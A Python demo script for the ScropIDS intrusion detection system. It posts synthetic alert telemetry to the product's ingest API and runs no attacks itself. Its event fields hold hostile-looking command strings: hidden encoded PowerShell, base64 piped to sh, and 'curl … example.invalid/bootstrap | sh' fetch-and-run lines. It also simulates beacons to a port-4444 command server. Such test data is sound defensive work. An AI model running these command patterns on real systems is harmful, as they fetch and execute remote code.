#!/usr/bin/env python3
"""Send safe synthetic IDS events for demo purposes.

This script does not execute real attacks on the host. It only posts crafted
telemetry to the ScropIDS ingest API using an enrolled agent identity.
"""

from __future__ import annotations

import argparse
import json
import os
import platform
import sys
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone
from pathlib import Path


DEFAULT_CONFIG_PATH = Path.home() / ".scropids" / "agent_config.json"

LEVEL_CHOICES = ("low", "medium", "high", "critical")
INTERACTIVE_LEVELS = {
    "1": ("low", "Low level - quiet baseline anomalies"),
    "2": ("medium", "Medium level - suspicious activity"),
    "3": ("high", "High level - likely alert activity"),
    "4": ("critical", "Critical level - full incident simulation"),
}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Send safe synthetic attack telemetry to ScropIDS.")
    parser.add_argument("--api-base", help="API base URL such as http://127.0.0.1:8000/api/v1")
    parser.add_argument("--agent-id", help="Agent ID")
    parser.add_argument("--agent-token", help="Agent token")
    parser.add_argument("--config", default=str(DEFAULT_CONFIG_PATH), help="Path to agent_config.json")
    parser.add_argument(
        "--scenario",
        default="all",
        choices=[
            "all",
            "credential-abuse",
            "process-burst",
            "external-beacon",
            "persistence",
        ],
        help="Telemetry bundle to send",
    )
    parser.add_argument(
        "--level",
        choices=LEVEL_CHOICES,
        help="Risk level to simulate. Overrides --scenario when set.",
    )
    parser.add_argument(
        "--platform",
        default="auto",
        choices=["auto", "windows", "linux", "macos"],
        help="Payload flavor to send",
    )
    parser.add_argument("--count", type=int, default=1, help="How many times to send the chosen scenario")
    parser.add_argument("--heartbeat", action="store_true", help="Send an agent heartbeat after posting events")
    args = parser.parse_args()
    if len(sys.argv) == 1 and sys.stdin.isatty():
        return prompt_interactive(args)
    return args


def prompt_interactive(args: argparse.Namespace) -> argparse.Namespace:
    print()
    print("ScropIDS Safe Attack Simulation")
    print("=" * 52)
    print("This sends harmless synthetic telemetry to your ScropIDS API.")
    print()
    for key, (_, description) in INTERACTIVE_LEVELS.items():
        print(f"{key}. {description}")
    print("q. Quit")
    print()

    while True:
        choice = input("Select simulation level: ").strip().lower()
        if choice in {"q", "quit", "exit"}:
            raise SystemExit("Exiting simulation.")
        selected = INTERACTIVE_LEVELS.get(choice)
        if selected:
            args.level = selected[0]
            break
        if choice in LEVEL_CHOICES:
            args.level = choice
            break
        print("Please choose 1, 2, 3, 4, or q.")

    platform_choice = input("Platform [auto/windows/linux/macos] (default: auto): ").strip().lower()
    if platform_choice in {"windows", "linux", "macos", "auto"}:
        args.platform = platform_choice
    elif platform_choice:
        print("Unknown platform choice. Using auto.")

    count_choice = input("Repeat count (default: 1): ").strip()
    if count_choice:
        try:
            args.count = max(int(count_choice), 1)
        except ValueError:
            print("Invalid count. Using 1.")
            args.count = 1

    heartbeat_choice = input("Send heartbeat after events? [y/N]: ").strip().lower()
    args.heartbeat = heartbeat_choice == "y"
    return args


def load_agent_config(path: str) -> dict:
    file_path = Path(path).expanduser()
    if not file_path.exists():
        return {}
    return json.loads(file_path.read_text())


def resolve_credentials(args: argparse.Namespace) -> tuple[str, str, str]:
    config = load_agent_config(args.config)
    api_base = args.api_base or os.getenv("SCROPIDS_API_BASE") or config.get("api_base") or "http://127.0.0.1:8000/api/v1"
    agent_id = args.agent_id or os.getenv("SCROPIDS_AGENT_ID") or config.get("agent_id")
    agent_token = args.agent_token or os.getenv("SCROPIDS_AGENT_TOKEN") or config.get("agent_token")

    if not agent_id or not agent_token:
        raise SystemExit(
            "Missing agent credentials. Pass --agent-id/--agent-token or use an installed agent config at ~/.scropids/agent_config.json."
        )

    return api_base.rstrip("/"), agent_id, agent_token


def resolve_platform(value: str) -> str:
    if value != "auto":
        return value
    system = platform.system().lower()
    if system.startswith("win"):
        return "windows"
    if system == "darwin":
        return "macos"
    return "linux"


def iso_now_minus(seconds_ago: int) -> str:
    return (datetime.now(timezone.utc) - timedelta(seconds=seconds_ago)).isoformat()


def event(timestamp: str, event_type: str, severity: str, data: dict) -> dict:
    return {
        "timestamp": timestamp,
        "event_type": event_type,
        "severity": severity,
        "data": data,
    }


def build_events(flavor: str, scenario: str) -> list[dict]:
    builders = {
        "credential-abuse": lambda: credential_abuse(flavor),
        "process-burst": lambda: process_burst(flavor),
        "external-beacon": lambda: external_beacon(flavor),
        "persistence": lambda: persistence(flavor),
        "all": lambda: credential_abuse(flavor) + process_burst(flavor) + external_beacon(flavor) + persistence(flavor),
    }
    return builders[scenario]()


def build_level_events(flavor: str, level: str) -> list[dict]:
    builders = {
        "low": lambda: low_level(flavor),
        "medium": lambda: medium_level(flavor),
        "high": lambda: credential_abuse(flavor) + process_burst(flavor),
        "critical": lambda: credential_abuse(flavor) + process_burst(flavor) + external_beacon(flavor) + persistence(flavor) + critical_level(flavor),
    }
    return builders[level]()


def low_level(flavor: str) -> list[dict]:
    return [
        event(
            iso_now_minus(90),
            "system_log",
            "low",
            {
                "source": "loginwindow" if flavor == "macos" else "auth",
                "message": "unusual login time observed for demo user",
                "platform": flavor,
            },
        ),
        event(
            iso_now_minus(75),
            "process_creation",
            "low",
            {
                "process_name": "Safari" if flavor == "macos" else "browser",
                "command_line": "browser extension requested additional permissions",
                "parent_process": "user-session",
                "user": "demo-operator",
            },
        ),
        event(
            iso_now_minus(60),
            "network_connection",
            "low",
            {"destination_ip": "203.0.113.25", "destination_port": 443, "protocol": "tcp", "platform": flavor},
        ),
    ]


def medium_level(flavor: str) -> list[dict]:
    return [
        event(
            iso_now_minus(95),
            "failed_login",
            "medium",
            {
                "username": "demo-operator",
                "source_ip": "198.51.100.44",
                "host": "demo-auth-01",
                "platform": flavor,
            },
        ),
        event(
            iso_now_minus(85),
            "failed_login",
            "medium",
            {
                "username": "demo-operator",
                "source_ip": "198.51.100.45",
                "host": "demo-auth-01",
                "platform": flavor,
            },
        ),
        event(
            iso_now_minus(70),
            "process_creation",
            "medium",
            {
                "process_name": "osascript" if flavor == "macos" else "shell",
                "command_line": "encoded command pattern observed in simulation",
                "parent_process": "office-document",
                "user": "demo-operator",
            },
        ),
        event(
            iso_now_minus(55),
            "file_modification",
            "medium",
            {
                "path": "/Users/demo/Downloads/invoice-demo.bin" if flavor == "macos" else "/tmp/invoice-demo.bin",
                "operation": "created",
                "user": "demo-operator",
                "platform": flavor,
            },
        ),
    ]


def critical_level(flavor: str) -> list[dict]:
    return [
        event(
            iso_now_minus(18),
            "network_connection",
            "critical",
            {
                "destination_ip": "203.0.113.250",
                "destination_port": 4444,
                "protocol": "tcp",
                "platform": flavor,
                "note": "simulated command-and-control beacon",
            },
        ),
        event(
            iso_now_minus(14),
            "file_modification",
            "critical",
            {
                "path": "/Users/demo/Documents/customer-records.zip" if flavor == "macos" else "/tmp/customer-records.zip",
                "operation": "staged",
                "user": "demo-operator",
                "platform": flavor,
            },
        ),
        event(
            iso_now_minus(10),
            "system_log",
            "critical",
            {
                "source": "incident-simulator",
                "message": "containment playbook activated for simulated host compromise",
                "platform": flavor,
            },
        ),
    ]


def credential_abuse(flavor: str) -> list[dict]:
    events: list[dict] = []
    for idx in range(8):
        events.append(
            event(
                iso_now_minus(120 - idx),
                "failed_login",
                "high",
                {
                    "username": "svc-backup",
                    "source_ip": f"203.0.113.{80 + idx}",
                    "host": "auth-node-01",
                    "platform": flavor,
                },
            )
        )

    if flavor == "windows":
        events.extend(
            [
                event(
                    iso_now_minus(95),
                    "process_creation",
                    "critical",
                    {
                        "process_name": "powershell.exe",
                        "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
                        "parent_process": "winword.exe",
                        "user": "nagu",
                    },
                ),
                event(
                    iso_now_minus(90),
                    "process_creation",
                    "high",
                    {
                        "process_name": "cmd.exe",
                        "command_line": "cmd.exe /c whoami && ipconfig /all",
                        "parent_process": "powershell.exe",
                        "user": "nagu",
                    },
                ),
            ]
        )
    elif flavor == "macos":
        events.extend(
            [
                event(
                    iso_now_minus(95),
                    "process_creation",
                    "high",
                    {
                        "process_name": "osascript",
                        "command_line": "osascript -e 'do shell script \"echo YmFk | base64 -D\"'",
                        "parent_process": "Microsoft Word",
                        "user": "nagu",
                    },
                ),
                event(
                    iso_now_minus(90),
                    "process_creation",
                    "high",
                    {
                        "process_name": "bash",
                        "command_line": "bash -lc 'curl -fsSL https://example.invalid/bootstrap | sh'",
                        "parent_process": "osascript",
                        "user": "nagu",
                    },
                ),
            ]
        )
    else:
        events.extend(
            [
                event(
                    iso_now_minus(95),
                    "process_creation",
                    "high",
                    {
                        "process_name": "bash",
                        "command_line": "bash -lc 'echo YmFk | base64 -d | sh'",
                        "parent_process": "sshd",
                        "user": "root",
                    },
                ),
                event(
                    iso_now_minus(90),
                    "process_creation",
                    "high",
                    {
                        "process_name": "python3",
                        "command_line": "python3 -c \"import os; print('invoke-expression')\"",
                        "parent_process": "bash",
                        "user": "root",
                    },
                ),
            ]
        )

    events.extend(
        [
            event(
                iso_now_minus(80),
                "network_connection",
                "high",
                {"destination_ip": "45.77.19.88", "destination_port": 443, "protocol": "tcp"},
            ),
            event(
                iso_now_minus(75),
                "network_connection",
                "high",
                {"destination_ip": "91.134.18.22", "destination_port": 8443, "protocol": "tcp"},
            ),
        ]
    )
    return events


def process_burst(flavor: str) -> list[dict]:
    process_name = {
        "windows": "powershell.exe",
        "macos": "osascript",
        "linux": "bash",
    }[flavor]
    parent = {
        "windows": "excel.exe",
        "macos": "Finder",
        "linux": "cron",
    }[flavor]

    commands = {
        "windows": [
            "powershell.exe -nop -enc SQBFAFgA",
            "powershell.exe -nop -enc UwB0AGEAcgB0AA==",
            "powershell.exe -nop -enc QQB0AHQAYQBjAGsA",
            "powershell.exe -nop -enc RABlAG0AbwA=",
            "powershell.exe -nop -enc VABlAGwAZQBtAGUAdAByAHkA",
        ],
        "macos": [
            "osascript -e 'do shell script \"echo base64\"'",
            "osascript -e 'do shell script \"echo invoke-expression\"'",
            "osascript -e 'do shell script \"curl -fsSL https://example.invalid\"'",
            "osascript -e 'do shell script \"echo -enc\"'",
            "osascript -e 'do shell script \"python3 -c print(1)\"'",
        ],
        "linux": [
            "bash -lc 'echo base64 | cat'",
            "bash -lc 'echo invoke-expression'",
            "bash -lc 'curl -fsSL https://example.invalid/bootstrap.sh'",
            "bash -lc 'printf -- -enc'",
            "bash -lc 'python3 -c \"print(1)\"'",
        ],
    }[flavor]

    return [
        event(
            iso_now_minus(60 - idx),
            "process_creation",
            "high",
            {
                "process_name": process_name,
                "command_line": command,
                "parent_process": parent,
                "user": "demo-operator",
            },
        )
        for idx, command in enumerate(commands)
    ]


def external_beacon(flavor: str) -> list[dict]:
    base = {
        "platform": flavor,
        "protocol": "tcp",
    }
    targets = [
        ("198.51.100.77", 8080),
        ("203.0.113.210", 8443),
        ("145.239.10.55", 443),
        ("172.67.22.14", 443),
    ]
    return [
        event(
            iso_now_minus(40 - idx),
            "network_connection",
            "high",
            {**base, "destination_ip": ip, "destination_port": port},
        )
        for idx, (ip, port) in enumerate(targets)
    ]


def persistence(flavor: str) -> list[dict]:
    if flavor == "windows":
        path = r"C:\\Users\\Public\\Startup\\Updater.vbs"
        source = "TaskScheduler"
    elif flavor == "macos":
        path = "/Users/demo/Library/LaunchAgents/com.demo.updater.plist"
        source = "launchd"
    else:
        path = "/etc/cron.d/update-check"
        source = "systemd"

    return [
        event(
            iso_now_minus(25),
            "file_modification",
            "high",
            {"path": path, "operation": "created", "user": "demo-operator", "platform": flavor},
        ),
        event(
            iso_now_minus(20),
            "system_log",
            "medium",
            {"source": source, "message": "new persistence entry detected", "platform": flavor},
        ),
    ]


def request_json(url: str, method: str, headers: dict, payload: dict | None = None) -> tuple[int, str]:
    data = None
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        raise SystemExit(f"{method} {url} failed: HTTP {exc.code} {body}") from exc
    except urllib.error.URLError as exc:
        raise SystemExit(f"{method} {url} failed: {exc.reason}") from exc


def main() -> int:
    args = parse_args()
    api_base, agent_id, agent_token = resolve_credentials(args)
    flavor = resolve_platform(args.platform)

    headers = {
        "Content-Type": "application/json",
        "X-Agent-ID": agent_id,
        "X-Agent-Token": agent_token,
    }

    total_events = 0
    for _ in range(max(args.count, 1)):
        events = build_level_events(flavor, args.level) if args.level else build_events(flavor, args.scenario)
        total_events += len(events)
        status, body = request_json(
            f"{api_base}/ingest/events/",
            "POST",
            headers,
            {"events": events},
        )
        print(f"Posted {len(events)} synthetic events: HTTP {status}")
        print(body)

    if args.heartbeat:
        status, body = request_json(
            f"{api_base}/ingest/heartbeat/",
            "POST",
            headers,
            {},
        )
        print(f"Heartbeat sent: HTTP {status}")
        print(body)

    print()
    target = f"level '{args.level}'" if args.level else f"scenario '{args.scenario}'"
    print(f"Done. Sent {total_events} total synthetic events for {target} ({flavor}).")
    print("If you are running only Django runserver, process pending events with:")
    if sys.platform == "win32":
        print('.\\backend\\.venv\\Scripts\\python.exe backend\\manage.py shell -c "from apps.core.services.pipeline import run_scheduler_tick; print(run_scheduler_tick())"')
    else:
        print('./backend/.venv/bin/python backend/manage.py shell -c "from apps.core.services.pipeline import run_scheduler_tick; print(run_scheduler_tick())"')
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
